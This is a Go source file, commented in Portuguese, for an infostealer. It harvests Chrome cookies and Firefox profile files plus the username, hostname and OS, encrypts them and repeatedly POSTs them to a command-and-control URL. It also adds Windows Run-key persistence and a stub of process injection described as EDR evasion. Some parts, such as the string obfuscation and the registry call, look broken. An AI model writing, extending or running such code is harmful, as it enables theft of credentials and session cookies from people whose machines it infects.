package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Chave de criptografia para ofuscação de dados 
var key = []byte("x9k3m7p2q8r5t1w4z6y0v8u3n2j5h4g")

// ofuscar strings em tempo de execução 
func obfuscate(s string) string {
    b := make([]byte, len(s))
    for i := 0; i < len(s); i++ {
        b[i] = s[i] ^ key[i%len(key)]
    }
    return base64.StdEncoding.EncodeToString(b)
}

// desofuscar strings
func deobfuscate(s string) string {
    b, _ := base64.StdEncoding.DecodeString(s)
    result := make([]byte, len(b))
    for i := 0; i < len(b); i++ {
        result[i] = b[i] ^ key[i%len(key)]
    }
    return string(result)
}

// armazenar informações coletadas
type Info struct {
    Username    string
    Hostname    string
    OS          string
    Files       map[string]string
    Credentials []string
}

// coletar informações do sistema
func collectSystemInfo() Info {
    info := Info{
        Files: make(map[string]string),
    }

    // nome de usuário
    u, _ := user.Current()
    info.Username = u.Username

    // hostname
    h, _ := os.Hostname()
    info.Hostname = h

    // sistema operacional
    info.OS = runtime.GOOS + " " + runtime.GOARCH

    // arquivos sensíveis 
    paths := []string{
        filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies"),
        filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
    }

    for _, path := range paths {
        files, _ := filepath.Glob(path + "/*")
        for _, file := range files {
            content, err := ioutil.ReadFile(file)
            if err == nil {
                info.Files[file] = base64.StdEncoding.EncodeToString(content)
            }
        }
    }

    return info
}

// criptografar dados antes da exfiltração
func encrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }

    return gcm.Seal(nonce, nonce, data, nil), nil
}

// exfiltrar dados para um servidor remoto
func exfiltrate(data string) error {
    // Ofusca a URL do servidor C2
    c2 := deobfuscate(obfuscate("http://example.com/upload"))
    encrypted, err := encrypt([]byte(data))
    if err != nil {
        return err
    }

    resp, err := http.Post(c2, "application/octet-stream", strings.NewReader(string(encrypted)))
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    return nil
}

// injeção em processos legítimos (evasão de EDR)
func injectIntoProcess() error {
    // Exemplo simplificado: Injeta payload em notepad.exe
    var procInfo syscall.ProcessInformation
    var startInfo syscall.StartupInfo

    cmd := deobfuscate(obfuscate("notepad.exe"))
    err := syscall.CreateProcess(
        nil,
        syscall.StringToUTF16Ptr(cmd),
        nil,
        nil,
        false,
        syscall.CREATE_SUSPENDED,
        nil,
        nil,
        &startInfo,
        &procInfo,
    )
    if err != nil {
        return err
    }

    // Injeção de código (simulada para evitar complexidade)
    // Aqui você usaria WriteProcessMemory e CreateRemoteThread por exemplo
    return nil
}

// persistência no sistema
func ensurePersistence() {
    // Adiciona ao registro do Windows 
    if runtime.GOOS == "windows" {
        keyPath := deobfuscate(obfuscate(`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`))
        cmd := deobfuscate(obfuscate(os.Args[0]))
        syscall.RegSetValueEx(
            syscall.HKEY_CURRENT_USER,
            syscall.StringToUTF16Ptr(keyPath),
            0,
            syscall.REG_SZ,
            (*byte)(unsafe.Pointer(syscall.StringToUTF16Ptr(cmd))),
            uint32(len(cmd)*2),
        )
    }
}

func main() {
    // Ofusca strings sensíveis
    fmt.Println(deobfuscate(obfuscate("Iniciando infostealer...")))

    // Garante persistência
    ensurePersistence()

    // Injeção em processos para evasão
    injectIntoProcess()

    // Coleta informações
    info := collectSystemInfo()

    // Serializa informações coletadas
    data := fmt.Sprintf("Username: %s\nHostname: %s\nOS: %s\nFiles: %v",
        info.Username, info.Hostname, info.OS, info.Files)

    // Exfiltra dados
    exfiltrate(data)

    // Loop para manter ativo (com comportamento dinâmico)
    for {
        time.Sleep(60 * time.Second)
        // Verifica por atualizações no servidor C2 (simulado)
        exfiltrate(data)
    }
}
